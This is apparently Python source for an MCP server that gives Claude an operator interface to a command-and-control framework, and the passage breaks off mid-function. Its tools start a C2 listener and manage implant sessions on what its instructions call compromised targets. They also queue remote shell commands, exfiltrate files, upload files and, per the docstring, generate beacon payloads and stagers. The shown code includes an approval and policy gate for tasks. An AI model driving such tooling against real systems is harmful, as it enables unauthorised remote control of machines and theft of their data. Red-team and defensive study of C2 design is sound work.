#!/usr/bin/env python3
"""
Ursa — C2 Operator MCP Server
================================
Claude's interface to the Ursa Major C2 framework.

Lets Claude manage sessions, issue tasks, track results, generate
payloads, and control the C2 — all from conversation.

Tools:
    Sessions:
        - ursa_sessions      — List all active/stale/dead sessions
        - ursa_session_info  — Get detailed info on a session
        - ursa_set_session_context — Set campaign/tags on a session
        - ursa_campaign_info — Get campaign summary
        - ursa_campaign_timeline — Get campaign timeline
        - ursa_campaign_add_note — Add campaign note
        - ursa_campaign_notes — List campaign notes
        - ursa_campaign_delete_note — Delete campaign note
        - ursa_campaign_checklist — List campaign checklist items
        - ursa_campaign_playbooks — List checklist playbooks
        - ursa_campaign_save_playbook — Create/update checklist playbook
        - ursa_campaign_delete_playbook — Delete checklist playbook
        - ursa_campaign_apply_playbook — Apply playbook to campaign checklist
        - ursa_campaign_snapshot_playbook — Snapshot campaign checklist into a playbook
        - ursa_campaign_add_checklist_item — Add campaign checklist item
        - ursa_campaign_update_checklist_item — Update checklist item
        - ursa_campaign_delete_checklist_item — Delete checklist item
        - ursa_campaign_bulk_update_checklist — Bulk status update by checklist filter
        - ursa_campaign_checklist_history — Checklist history timeline
        - ursa_campaign_checklist_alerts — Checklist due/overdue alert view
        - ursa_campaign_checklist_from_alerts — Generate checklist items from policy alerts
        - ursa_campaign_handoff — Generate handoff brief
        - ursa_campaign_handoff_report — Export handoff report
        - ursa_kill_session  — Kill a session

    Tasking:
        - ursa_shell         — Run a shell command on a target
        - ursa_task          — Send any task type to a session
        - ursa_task_result   — Check a task's result
        - ursa_tasks         — List tasks for a session

    Files:
        - ursa_download      — Download a file from a target
        - ursa_upload        — Upload a file to a target
        - ursa_files         — List exfiltrated files

    C2 Management:
        - ursa_start_c2      — Start the C2 server daemon
        - ursa_stop_c2       — Stop the C2 server
        - ursa_c2_status     — Check if C2 is running
        - ursa_events        — View C2 event log
        - ursa_approvals     — View pending/approved/rejected approvals
        - ursa_approve       — Approve one request
        - ursa_reject        — Reject one request
        - ursa_approve_campaign — Bulk-approve requests by campaign/tag
        - ursa_reject_campaign — Bulk-reject requests by campaign/tag

    Payload Generation:
        - ursa_generate      — Generate a beacon payload
        - ursa_stager        — Generate a stager one-liner

Run with:
    /path/to/ursa/venv/bin/python3 server.py
"""

import base64
import csv
import json
import os
import signal
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path

from mcp.server.fastmcp import FastMCP

# Add project root to path
PROJECT_ROOT = Path(__file__).parent
sys.path.insert(0, str(PROJECT_ROOT))

from major.db import (  # noqa: E402
    add_campaign_checklist_item,
    add_campaign_note,
    apply_campaign_playbook,
    delete_campaign_checklist_item,
    delete_campaign_note,
    delete_campaign_playbook,
    delete_campaign_policy,
    evaluate_campaign_policy_alerts,
    get_campaign_timeline,
    get_events,
    get_immutable_audit,
    get_session,
    get_task,
    kill_session,
    list_approval_requests,
    list_campaign_checklist,
    list_campaign_checklist_history,
    list_campaign_notes,
    list_campaign_playbooks,
    list_campaign_policies,
    list_files,
    list_sessions,
    list_tasks,
    snapshot_campaign_checklist_to_playbook,
    update_campaign_checklist_item,
    update_session_info,
    upsert_campaign_playbook,
    upsert_campaign_policy,
    verify_immutable_audit_chain,
)
from major.governance import (  # noqa: E402
    format_risk_matrix,
    get_policy_remediation_plan,
    normalize_args_string,
    process_approval_decision,
    process_bulk_approval_decisions,
    queue_task_with_policy,
)

mcp_server = FastMCP(
    "ursa",
    instructions="""Ursa — Command & Control operator interface.
    You have tools to manage implant sessions, issue commands to compromised
    targets, track results, generate payloads, and control the C2 server.
    The C2 server (Ursa Major) must be running for session management to work.
    Use ursa_start_c2 to launch it if needed.""",
)

VENV_PYTHON = str(PROJECT_ROOT / "venv" / "bin" / "python3")
C2_PID_FILE = str(PROJECT_ROOT / "major" / ".c2.pid")


def _format_time(ts):
    """Format a Unix timestamp to human-readable."""
    if not ts:
        return "never"
    return datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")


def _time_ago(ts):
    """Human-readable time since timestamp."""
    if not ts:
        return "never"
    diff = time.time() - ts
    if diff < 60:
        return f"{int(diff)}s ago"
    elif diff < 3600:
        return f"{int(diff/60)}m ago"
    elif diff < 86400:
        return f"{int(diff/3600)}h ago"
    else:
        return f"{int(diff/86400)}d ago"


# ── C2 Management ──


@mcp_server.tool()
def ursa_start_c2(port: int = 8443, host: str = "0.0.0.0") -> str:
    """
    Start the Ursa Major C2 server as a background daemon.

    Args:
        port: Port to listen on (default 8443)
        host: Bind address (default 0.0.0.0)
    """
    # Check if already running
    if os.path.exists(C2_PID_FILE):
        try:
            with open(C2_PID_FILE) as f:
                pid = int(f.read().strip())
            os.kill(pid, 0)  # Check if process exists
            return f"Ursa Major is already running (PID {pid}) on port {port}"
        except (ProcessLookupError, ValueError):
            os.unlink(C2_PID_FILE)

    # Start C2 server
    proc = subprocess.Popen(
        [VENV_PYTHON, str(PROJECT_ROOT / "major" / "server.py"), "--port", str(port), "--host", host],
        cwd=str(PROJECT_ROOT),
        stdout=open(str(PROJECT_ROOT / "major" / "c2.log"), "a"),
        stderr=subprocess.STDOUT,
        start_new_session=True,
    )

    with open(C2_PID_FILE, "w") as f:
        f.write(str(proc.pid))

    time.sleep(1)

    if proc.poll() is None:
        return f"Ursa Major C2 started on {host}:{port} (PID {proc.pid})"
    else:
        return "Failed to start C2 server. Check major/c2.log for errors."


@mcp_server.tool()
def ursa_stop_c2() -> str:
    """Stop the Ursa Major C2 server."""
    if not os.path.exists(C2_PID_FILE):
        return "Ursa Major is not running (no PID file)"

    try:
        with open(C2_PID_FILE) as f:
            pid = int(f.read().strip())
        os.kill(pid, signal.SIGTERM)
        os.unlink(C2_PID_FILE)
        return f"Ursa Major stopped (PID {pid})"
    except ProcessLookupError:
        os.unlink(C2_PID_FILE)
        return "Ursa Major was not running (stale PID file removed)"
    except Exception as e:
        return f"Error stopping C2: {e}"


@mcp_server.tool()
def ursa_c2_status() -> str:
    """Check if the Ursa Major C2 server is running and show stats."""
    running = False
    pid = None

    if os.path.exists(C2_PID_FILE):
        try:
            with open(C2_PID_FILE) as f:
                pid = int(f.read().strip())
            os.kill(pid, 0)
            running = True
        except (ProcessLookupError, ValueError):
            pass

    sessions = list_sessions()
    active = [s for s in sessions if s["status"] == "active"]
    stale = [s for s in sessions if s["status"] == "stale"]
    dead = [s for s in sessions if s["status"] == "dead"]

    lines = [
        "URSA MAJOR — STATUS",
        "=" * 40,
        f"Server:     {'RUNNING (PID ' + str(pid) + ')' if running else 'STOPPED'}",
        f"Sessions:   {len(active)} active, {len(stale)} stale, {len(dead)} dead",
        f"Total:      {len(sessions)}",
    ]

    if active:
        lines.append("")
        lines.append("Active Sessions:")
        for s in active:
            lines.append(f"  {s['id']}  {s['username']}@{s['hostname']}  "
                        f"({s['remote_ip']})  last: {_time_ago(s['last_seen'])}")

    return "\n".join(lines)


# ── Session Management ──


@mcp_server.tool()
def ursa_sessions(
    status: str | None = None,
    campaign: str | None = None,
    tag: str | None = None,
) -> str:
    """
    List all implant sessions.

    Args:
        status: Filter by status — "active", "stale", or "dead".
        campaign: Filter by campaign name.
        tag: Filter by tag substring.
    """
    sessions = list_sessions(status=status, campaign=campaign, tag=tag)

    if not sessions:
        return f"No {'sessions' if not status else status + ' sessions'} found."

    lines = [
        f"{'ID':<10} {'User@Host':<26} {'Campaign':<14} {'Tags':<18} {'Last Seen':<12} {'Status'}",
        "-" * 110,
    ]

    for s in sessions:
        user_host = f"{s['username']}@{s['hostname']}"
        campaign_name = s.get("campaign") or "-"
        tags = s.get("tags") or "-"
        lines.append(
            f"{s['id']:<10} {user_host[:26]:<26} {campaign_name[:14]:<14} {tags[:18]:<18} "
            f"{_time_ago(s['last_seen']):<12} {s['status']}"
        )

    lines.append(f"\n{len(sessions)} sessions total")
    return "\n".join(lines)


@mcp_server.tool()
def ursa_set_session_context(session_id: str, campaign: str = "", tags: str = "") -> str:
    """
    Set campaign and tags for a session to support grouping/organization.

    Args:
        session_id: Target session ID.
        campaign: Campaign/group name.
        tags: Comma-separated tags (e.g., "finance,dc1,high-value").
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."
    update_session_info(session_id, campaign=campaign.strip(), tags=tags.strip())
    return (
        f"Session {session_id} updated.\n"
        f"Campaign: {campaign.strip() or '-'}\n"
        f"Tags: {tags.strip() or '-'}"
    )


@mcp_server.tool()
def ursa_session_info(session_id: str) -> str:
    """
    Get detailed information about a specific session.

    Args:
        session_id: The session ID to look up
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."

    tasks = list_tasks(session_id=session_id, limit=10)
    files = list_files(session_id=session_id)

    lines = [
        f"SESSION: {s['id']}",
        "=" * 50,
        f"  Status:      {s['status']}",
        f"  Remote IP:   {s['remote_ip']}",
        f"  Hostname:    {s['hostname']}",
        f"  Username:    {s['username']}",
        f"  OS:          {s['os']}",
        f"  Arch:        {s['arch']}",
        f"  PID:         {s['pid']}",
        f"  Process:     {s['process_name']}",
        f"  Campaign:    {s.get('campaign') or '-'}",
        f"  Tags:        {s.get('tags') or '-'}",
        f"  First seen:  {_format_time(s['first_seen'])}",
        f"  Last seen:   {_format_time(s['last_seen'])} ({_time_ago(s['last_seen'])})",
        f"  Interval:    {s['beacon_interval']}s (jitter: {s['jitter']})",
        f"  Encrypted:   {'Yes' if s.get('encryption_key') else 'No'}",
    ]

    if tasks:
        lines.append(f"\n  Recent Tasks ({len(tasks)}):")
        for t in tasks:
            status_icon = {"completed": "✓", "error": "✗", "pending": "○", "in_progress": "◐"}.get(t["status"], "?")
            lines.append(f"    {status_icon} {t['id']}  {t['task_type']:<12}  {t['status']}")

    if files:
        lines.append(f"\n  Files ({len(files)}):")
        for f in files:
            lines.append(f"    {f['id']}  {f['filename']:<25}  {f['size']}B  {f['direction']}")

    return "\n".join(lines)


@mcp_server.tool()
def ursa_kill_session(session_id: str) -> str:
    """
    Kill/deactivate a session.

    Args:
        session_id: The session ID to kill
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."

    decision = queue_task_with_policy(
        session_id=session_id,
        task_type="kill",
        args={},
        actor="mcp:ursa_kill_session",
    )
    if decision["status"] == "approval_required":
        return (
            f"Kill action requires approval ({decision['risk_level']} risk).\n"
            f"Approval ID: {decision['approval_id']}\n"
            f"Use ursa_approve('{decision['approval_id']}') to proceed."
        )
    if decision["status"] != "queued":
        return f"Kill action denied: {decision['message']}"
    kill_session(session_id)
    return (
        f"Session {session_id} ({s['username']}@{s['hostname']}) killed.\n"
        f"Kill task queued: {decision['task_id']}"
    )


# ── Tasking ──


@mcp_server.tool()
def ursa_shell(session_id: str, command: str) -> str:
    """
    Execute a shell command on a target.

    The command is queued and will execute on the next beacon check-in.
    Use ursa_task_result to check the output.

    Args:
        session_id: Target session ID
        command: Shell command to execute
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."
    if s["status"] == "dead":
        return f"Session {session_id} is dead. Cannot issue tasks."

    decision = queue_task_with_policy(
        session_id=session_id,
        task_type="shell",
        args={"command": command},
        actor="mcp:ursa_shell",
    )
    if decision["status"] == "approval_required":
        return (
            f"Shell task requires approval ({decision['risk_level']} risk).\n"
            f"Approval ID: {decision['approval_id']}\n"
            f"{decision['message']}"
        )
    if decision["status"] != "queued":
        return f"Shell task denied: {decision['message']}"
    task_id = decision["task_id"]
    return (f"Shell task queued: {task_id}\n"
            f"Target: {s['username']}@{s['hostname']}\n"
            f"Command: {command}\n"
            f"Will execute on next beacon (interval: {s['beacon_interval']}s)")


@mcp_server.tool()
def ursa_task(session_id: str, task_type: str, args: str = "{}") -> str:
    """
    Send any task type to a session.

    Task types: shell, sysinfo, download, upload, sleep, kill, ps,
                pwd, cd, ls, whoami, env

    Args:
        session_id: Target session ID
        task_type: The task type to send
        args: JSON string of arguments (e.g., '{"command": "whoami"}')
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."

    try:
        task_args = normalize_args_string(args)
    except ValueError as exc:
        return str(exc)

    decision = queue_task_with_policy(
        session_id=session_id,
        task_type=task_type,
        args=task_args,
        actor="mcp:ursa_task",
    )
    if decision["status"] == "approval_required":
        return (
            f"Task requires approval ({decision['risk_level']} risk).\n"
            f"Approval ID: {decision['approval_id']}\n"
            f"Type: {task_type}\n"
            f"Args: {json.dumps(task_args)}"
        )
    if decision["status"] != "queued":
        return f"Task denied: {decision['message']}"
    task_id = decision["task_id"]
    return (f"Task queued: {task_id}\n"
            f"Type: {task_type}\n"
            f"Args: {json.dumps(task_args)}\n"
            f"Target: {s['username']}@{s['hostname']}")


@mcp_server.tool()
def ursa_task_result(task_id: str) -> str:
    """
    Check the result of a task.

    Args:
        task_id: The task ID to check
    """
    t = get_task(task_id)
    if not t:
        return f"Task {task_id} not found."

    lines = [
        f"TASK: {t['id']}",
        f"Type:      {t['task_type']}",
        f"Session:   {t['session_id']}",
        f"Status:    {t['status']}",
        f"Created:   {_format_time(t['created_at'])}",
    ]

    if t.get("picked_up_at"):
        lines.append(f"Picked up: {_format_time(t['picked_up_at'])}")
    if t.get("completed_at"):
        lines.append(f"Completed: {_format_time(t['completed_at'])}")

    if t["status"] == "pending":
        lines.append("\n(Waiting for implant to check in...)")
    elif t["status"] == "in_progress":
        lines.append("\n(Implant picked up task, waiting for result...)")
    elif t.get("result"):
        lines.append(f"\n--- Output ---\n{t['result']}")
    if t.get("error"):
        lines.append(f"\n--- Error ---\n{t['error']}")

    return "\n".join(lines)


@mcp_server.tool()
def ursa_tasks(
    session_id: str | None = None,
    status: str | None = None,
    campaign: str | None = None,
    tag: str | None = None,
    limit: int = 20,
) -> str:
    """
    List tasks, optionally filtered by session and/or status.

    Args:
        session_id: Filter to a specific session
        status: Filter by status — "pending", "in_progress", "completed", "error"
        campaign: Filter by campaign name
        tag: Filter by tag substring
        limit: Max tasks to return (default 20)
    """
    tasks = list_tasks(
        session_id=session_id,
        status=status,
        campaign=campaign,
        tag=tag,
        limit=limit,
    )

    if not tasks:
        return "No tasks found."

    lines = [
        f"{'ID':<10} {'Session':<10} {'Campaign':<14} {'Type':<12} {'Status':<12} {'Created'}",
        "-" * 85,
    ]

    for t in tasks:
        lines.append(
            f"{t['id']:<10} {t['session_id']:<10} {(t.get('campaign') or '-')[:14]:<14} {t['task_type']:<12} "
            f"{t['status']:<12} {_time_ago(t['created_at'])}"
        )

    return "\n".join(lines)


# ── File Operations ──


@mcp_server.tool()
def ursa_download(session_id: str, remote_path: str) -> str:
    """
    Download a file from a target (exfiltrate to C2).

    Queues a download task. The file will be available via ursa_files
    once the implant checks in and sends it.

    Args:
        session_id: Target session ID
        remote_path: Path on the target to download
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."

    decision = queue_task_with_policy(
        session_id=session_id,
        task_type="download",
        args={"path": remote_path},
        actor="mcp:ursa_download",
    )
    if decision["status"] == "approval_required":
        return (
            f"Download task requires approval ({decision['risk_level']} risk).\n"
            f"Approval ID: {decision['approval_id']}"
        )
    if decision["status"] != "queued":
        return f"Download task denied: {decision['message']}"
    task_id = decision["task_id"]
    return (f"Download task queued: {task_id}\n"
            f"Target file: {remote_path}\n"
            f"Will transfer on next beacon check-in.")


@mcp_server.tool()
def ursa_upload(session_id: str, local_path: str, remote_path: str) -> str:
    """
    Upload a file to a target (deliver from C2).

    Args:
        session_id: Target session ID
        local_path: Local file path to upload
        remote_path: Destination path on the target
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."

    local_path_expanded = os.path.expanduser(local_path)
    if not os.path.exists(local_path_expanded):
        return f"Local file not found: {local_path}"

    with open(local_path_expanded, "rb") as f:
        data = f.read()

    decision = queue_task_with_policy(
        session_id=session_id,
        task_type="upload",
        args={"path": remote_path, "data": base64.b64encode(data).decode()},
        actor="mcp:ursa_upload",
    )
    if decision["status"] == "approval_required":
        return (
            f"Upload task requires approval ({decision['risk_level']} risk).\n"
            f"Approval ID: {decision['approval_id']}"
        )
    if decision["status"] != "queued":
        return f"Upload task denied: {decision['message']}"
    task_id = decision["task_id"]
    return (f"Upload task queued: {task_id}\n"
            f"File: {local_path} ({len(data)} bytes) → {remote_path}")


@mcp_server.tool()
def ursa_files(session_id: str | None = None) -> str:
    """
    List files transferred to/from implants.

    Args:
        session_id: Filter to a specific session (optional)
    """
    files = list_files(session_id=session_id)

    if not files:
        return "No files stored."

    lines = [
        f"{'ID':<10} {'Session':<10} {'Filename':<30} {'Size':<10} {'Dir':<10} {'Time'}",
        "-" * 85,
    ]

    for f in files:
        lines.append(
            f"{f['id']:<10} {f['session_id']:<10} {f['filename']:<30} "
            f"{f['size']:<10} {f['direction']:<10} {_time_ago(f['created_at'])}"
        )

    return "\n".join(lines)


# ── Events ──


@mcp_server.tool()
def ursa_events(
    limit: int = 30,
    level: str | None = None,
    campaign: str | None = None,
    tag: str | None = None,
) -> str:
    """
    View the C2 event log.

    Args:
        limit: Number of events to show (default 30)
        level: Filter by level — "info", "warning", "error"
        campaign: Filter by campaign name
        tag: Filter by tag substring
    """
    events = get_events(limit=limit, level=level, campaign=campaign, tag=tag)

    if not events:
        return "No events."

    lines = []
    for e in events:
        ts = datetime.fromtimestamp(e["timestamp"]).strftime("%H:%M:%S")
        sid = f" [{e['session_id']}]" if e.get("session_id") else ""
        camp = f" ({e['campaign']})" if e.get("campaign") else ""
        lines.append(f"[{ts}] {e['level'].upper():<7} {e['source']}{sid}{camp}: {e['message']}")

    return "\n".join(lines)


@mcp_server.tool()
def ursa_campaigns() -> str:
    """Summarize session/task/event activity by campaign."""
    sessions = list_sessions()
    tasks = list_tasks(limit=1000)
    events = get_events(limit=1000)

    campaigns: dict[str, dict[str, int]] = {}
    for s in sessions:
        name = (s.get("campaign") or "unassigned").strip() or "unassigned"
        campaigns.setdefault(name, {"sessions": 0, "tasks": 0, "events": 0})
        campaigns[name]["sessions"] += 1
    for t in tasks:
        name = (t.get("campaign") or "unassigned").strip() or "unassigned"
        campaigns.setdefault(name, {"sessions": 0, "tasks": 0, "events": 0})
        campaigns[name]["tasks"] += 1
    for e in events:
        name = (e.get("campaign") or "unassigned").strip() or "unassigned"
        campaigns.setdefault(name, {"sessions": 0, "tasks": 0, "events": 0})
        campaigns[name]["events"] += 1

    if not campaigns:
        return "No campaign activity found."

    lines = [
        f"{'Campaign':<20} {'Sessions':<10} {'Tasks':<10} {'Events'}",
        "-" * 56,
    ]
    for name, counts in sorted(campaigns.items(), key=lambda item: item[0]):
        lines.append(
            f"{name[:20]:<20} {counts['sessions']:<10} {counts['tasks']:<10} {counts['events']}"
        )
    return "\n".join(lines)


@mcp_server.tool()
def ursa_campaign_report(campaign: str, output_format: str = "json") -> str:
    """
    Export a campaign report to disk.

    Args:
        campaign: Campaign name to export.
        output_format: "json" or "csv".
    """
    campaign_name = campaign.strip()
    if not campaign_name:
        return "Campaign is required."
    fmt = output_format.strip().lower()
    if fmt not in {"json", "csv"}:
        return "output_format must be 'json' or 'csv'."

    sessions = list_sessions(campaign=campaign_name)
    tasks = list_tasks(campaign=campaign_name, limit=5000)
    events = get_events(campaign=campaign_name, limit=5000)
    notes = list_campaign_notes(campaign=campaign_name, limit=2000)

    reports_dir = PROJECT_ROOT / "reports"
    reports_dir.mkdir(parents=True, exist_ok=True)
    safe_name = "".join(ch if ch.isalnum() or ch in "-_." else "_" for ch in campaign_name)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")

    if fmt == "json":
        report = {
            "campaign": campaign_name,
            "generated_at": datetime.now().isoformat(),
            "counts": {
                "sessions": len(sessions),
                "tasks": len(tasks),
                "events": len(events),
                "notes": len(notes),
            },
            "sessions": sessions,
            "tasks": tasks,
            "events": events,
            "notes": notes,
        }
        out_path = reports_dir / f"campaign_{safe_name}_{ts}.json"
        with open(out_path, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2)
    else:
        out_path = reports_dir / f"campaign_{safe_name}_{ts}.csv"
        with open(out_path, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["section", "id", "session_id", "type", "status_or_level", "message"])
            for s in sessions:
                writer.writerow(["session", s["id"], s["id"], "session", s.get("status", ""), s.get("hostname", "")])
            for t in tasks:
                writer.writerow(["task", t["id"], t.get("session_id", ""), t.get("task_type", ""), t.get("status", ""), ""])
            for e in events:
                writer.writerow(["event", e["id"], e.get("session_id", ""), e.get("source", ""), e.get("level", ""), e.get("message", "")])
            for n in notes:
                writer.writerow(["note", n["id"], "", n.get("author", ""), "info", n.get("note", "")])

    return (
        f"Campaign report exported.\n"
        f"Campaign: {campaign_name}\n"
        f"Format: {fmt}\n"
        f"Path: {out_path}"
    )


@mcp_server.tool()
def ursa_campaign_info(campaign: str) -> str:
    """
    Show detailed operational context for a campaign.

    Args:
        campaign: Campaign name.
    """
    campaign_name = campaign.strip()
    if not campaign_name:
        return "Campaign is required."
    sessions = list_sessions(campaign=campaign_name)
    tasks = list_tasks(campaign=campaign_name, limit=200)
    events = get_events(campaign=campaign_name, limit=200)
    approvals = list_approval_requests(status="pending", campaign=campaign_name, limit=200)
    notes = list_campaign_notes(campaign=campaign_name, limit=200)
    checklist = list_campaign_checklist(campaign=campaign_name, limit=300)
    if not sessions and not tasks and not events and not approvals and not notes and not checklist:
        return f"No activity found for campaign '{campaign_name}'."

    by_status: dict[str, int] = {}
    by_task_type: dict[str, int] = {}
    by_risk: dict[str, int] = {"critical": 0, "high": 0, "medium": 0, "low": 0}
    checklist_counts = {"pending": 0, "in_progress": 0, "blocked": 0, "done": 0}
    for s in sessions:
        status = s.get("status", "unknown")
        by_status[status] = by_status.get(status, 0) + 1
    for t in tasks:
        ttype = t.get("task_type", "unknown")
        by_task_type[ttype] = by_task_type.get(ttype, 0) + 1
    for a in approvals:
        risk = (a.get("risk_level") or "").lower()
        if risk in by_risk:
            by_risk[risk] += 1
    for row in checklist:
        st = (row.get("status") or "pending").strip().lower()
        if st not in checklist_counts:
            st = "pending"
        checklist_counts[st] += 1

    lines = [
        f"CAMPAIGN: {campaign_name}",
        "=" * 50,
        f"Sessions:          {len(sessions)}",
        f"Tasks (recent):    {len(tasks)}",
        f"Events (recent):   {len(events)}",
        f"Pending approvals: {len(approvals)}",
        f"Notes:             {len(notes)}",
        f"Checklist items:   {len(checklist)}",
        "",
        "Session Status:",
    ]
    for key, count in sorted(by_status.items(), key=lambda item: item[0]):
        lines.append(f"  {key}: {count}")

    lines.extend(
        [
            "",
            "Task Types:",
        ]
    )
    for key, count in sorted(by_task_type.items(), key=lambda item: item[1], reverse=True)[:10]:
        lines.append(f"  {key}: {count}")

    lines.extend(
        [
            "",
            "Pending Approval Risk:",
            f"  critical: {by_risk['critical']}",
            f"  high:     {by_risk['high']}",
            f"  medium:   {by_risk['medium']}",
            f"  low:      {by_risk['low']}",
        ]
    )
    lines.extend(
        [
            "",
            "Checklist Status:",
            f"  pending:     {checklist_counts['pending']}",
            f"  in_progress: {checklist_counts['in_progress']}",
            f"  blocked:     {checklist_counts['blocked']}",
            f"  done:        {checklist_counts['done']}",
        ]
    )
    if sessions:
        lines.append("")
        lines.append("Recent Sessions:")
        for s in sessions[:10]:
            lines.append(
                f"  {s['id']} {s['username']}@{s['hostname']} "
                f"({s['remote_ip']}) {s['status']}"
            )
    if notes:
        lines.append("")
        lines.append("Recent Notes:")
        for n in notes[:10]:
            lines.append(f"  [{_format_time(n['created_at'])}] {n['author']}: {n['note']}")
    return "\n".join(lines)


@mcp_server.tool()
def ursa_campaign_timeline(campaign: str, limit: int = 100) -> str:
    """
    Show unified campaign timeline (events, tasks, approvals).
    """
    name = campaign.strip()
    if not name:
        return "Campaign is required."
    rows = get_campaign_timeline(name, limit=max(1, min(limit, 500)))
    if not rows:
        return f"No timeline entries for campaign '{name}'."

    lines = [
        f"CAMPAIGN TIMELINE: {name}",
        "=" * 70,
        f"{'Time':<19} {'Kind':<10} {'Ref':<10} {'Severity':<12} {'Summary'}",
        "-" * 100,
    ]
    for row in rows:
        ts = datetime.fromtimestamp(row["ts"]).strftime("%Y-%m-%d %H:%M:%S")
        lines.append(
            f"{ts:<19} {row['kind']:<10} {row['ref_id'][:10]:<10} "
            f"{str(row.get('severity', ''))[:12]:<12} {row.get('summary', '')}"
        )
    return "\n".join(lines)


@mcp_server.tool()
def ursa_campaign_add_note(campaign: str, note: str, author: str = "mcp:operator") -> str:
    """Add an operator note to a campaign."""
    name = campaign.strip()
    text = note.strip()
    if not name:
        return "Campaign is required."
    if not text:
        return "Note is required."
    add_campaign_note(name, text, author=author.strip() or "mcp:operator")
    return f"Added note to campaign {name}."


@mcp_server.tool()
def ursa_campaign_notes(campaign: str, limit: int = 30) -> str:
    """List recent campaign notes."""
    name = campaign.strip()
    if not name:
        return "Campaign is required."
    rows = list_campaign_notes(campaign=name, limit=max(1, min(limit, 200)))
    if not rows:
        return f"No notes for campaign '{name}'."
    lines = [f"CAMPAIGN NOTES: {name}", "=" * 70]
    for row in rows:
        lines.append(f"[{_format_time(row['created_at'])}] {row['author']}: {row['note']}")
    return "\n".join(lines)


@mcp_server.tool()
def ursa_campaign_playbooks(limit: int = 50) -> str:
    """List available checklist playbooks."""
    rows = list_campaign_playbooks(limit=max(1, min(limit, 200)))
    if not rows:
        return "No campaign playbooks configured."
    lines = [f"{'Playbook':<24} {'Items':<8} {'Updated':<20} Description", "-" * 90]
    for row in rows:
        lines.append(
            f"{row['name'][:24]:<24} {len(row.get('items') or []):<8} "
            f"{_format_time(row.get('updated_at')):<20} {row.get('description') or ''}"
        )
    return "\n".join(lines)


@mcp_server.tool()
def ursa_campaign_save_playbook(name: str, items_json: str, description: str = "") -> str:
    """Create or update a checklist playbook from JSON list of items."""
    playbook = name.strip()
    if not playbook:
        return "name is required."
    try:
        items = json.loads(items_json)
    except json.JSONDecodeError:
        return "items_json must be valid JSON (array of strings or item objects)."
    try:
        row = upsert_campaign_playbook(playbook, items=items, description=description.strip())
    except ValueError as exc:
        return f"Invalid playbook: {exc}"
    return (
        f"Playbook saved.\n"
        f"Name: {row['name']}\n"
        f"Items: {len(row.get('items') or [])}\n"
        f"Updated: {_format_time(row.get('updated_at'))}"
    )


@mcp_server.tool()
def ursa_campaign_delete_playbook(name: str) -> str:
    """Delete a checklist playbook by name."""
    playbook = name.strip()
    if not playbook:
        return "name is required."
    deleted = delete_campaign_playbook(playbook)
    return f"Deleted playbook {playbook}." if deleted else f"Playbook {playbook} not found."


@mcp_server.tool()
def ursa_campaign_apply_playbook(
    campaign: str,
    playbook: str,
    owner: str = "",
    due_base_iso: str = "",
    skip_existing: bool = True,
) -> str:
    """Apply a checklist playbook to a campaign."""
    campaign_name = campaign.strip()
    playbook_name = playbook.strip()
    if not campaign_name:
        return "campaign is required."
    if not playbook_name:
        return "playbook is required."
    due_base = None
    if due_base_iso.strip():
        try:
            due_base = datetime.fromisoformat(due_base_iso.strip()).timestamp()
        except ValueError:
            return "due_base_iso must be ISO date/datetime (example: 2026-03-09T09:00)."
    result = apply_campaign_playbook(
        campaign=campaign_name,
        playbook_name=playbook_name,
        default_owner=owner.strip(),
        due_base=due_base,
        skip_existing=skip_existing,
    )
    if result.get("missing"):
        return f"Playbook '{playbook_name}' not found."
    return (
        f"Applied playbook to campaign.\n"
        f"Campaign: {campaign_name}\n"
        f"Playbook: {playbook_name}\n"
        f"Created: {result['created']}\n"
        f"Skipped existing: {result['skipped']}\n"
        f"Total in playbook: {result['total']}"
    )


@mcp_server.tool()
def ursa_campaign_snapshot_playbook(
    campaign: str,
    name: str,
    description: str = "",
    only_open: bool = True,
) -> str:
    """Snapshot current campaign checklist into a reusable playbook."""
    campaign_name = campaign.strip()
    playbook_name = name.strip()
    if not campaign_name:
        return "campaign is required."
    if not playbook_name:
        return "name is required."
    try:
        row = snapshot_campaign_checklist_to_playbook(
            campaign=campaign_name,
            playbook_name=playbook_name,
            description=description.strip(),
            only_open=only_open,
        )
    except ValueError as exc:
        return str(exc)
    return (
        f"Playbook snapshot saved.\n"
        f"Campaign: {campaign_name}\n"
        f"Playbook: {row['name']}\n"
        f"Items: {len(row.get('items') or [])}\n"
        f"Updated: {_format_time(row.get('updated_at'))}"
    )


@mcp_server.tool()
def ursa_campaign_checklist(
    campaign: str,
    status: str | None = None,
    owner: str | None = None,
    query: str | None = None,
    sort: str = "created_desc",
    limit: int = 50,
) -> str:
    """List campaign checklist items."""
    name = campaign.strip()
    if not name:
        return "Campaign is required."
    normalized_status = (status or "").strip().lower() or None
    if normalized_status and normalized_status not in {"pending", "in_progress", "blocked", "done"}:
        return "status must be one of: pending, in_progress, blocked, done."
    normalized_sort = sort.strip().lower()
    if normalized_sort not in {"created_desc", "created_asc", "updated_desc", "updated_asc", "due_asc", "due_desc"}:
        return "sort must be one of: created_desc, created_asc, updated_desc, updated_asc, due_asc, due_desc."
    rows = list_campaign_checklist(
        campaign=name,
        status=normalized_status,
        owner=(owner or "").strip() or None,
        text=(query or "").strip() or None,
        sort=normalized_sort,
        limit=max(1, min(limit, 500)),
    )
    if not rows:
        return f"No checklist items for campaign '{name}'."
    lines = [f"CAMPAIGN CHECKLIST: {name}", "=" * 90]
    for row in rows:
        due = _format_time(row["due_at"]) if row.get("due_at") else "-"
        lines.append(
            f"{row['id']:<6} {row['status']:<12} owner={row.get('owner') or '-':<16} "
            f"due={due:<19} {row['title']}"
        )
        if row.get("details"):
            lines.append(f"       details: {row['details']}")
    return "\n".join(lines)


@mcp_server.tool()
def ursa_campaign_checklist_history(
    campaign: str,
    action: str = "",
    item_id: int = 0,
    limit: int = 50,
) -> str:
    """List checklist history entries for a campaign."""
    name = campaign.strip()
    if not name:
        return "campaign is required."
    action_filter = action.strip().lower() or None
    rows = list_campaign_checklist_history(
        campaign=name,
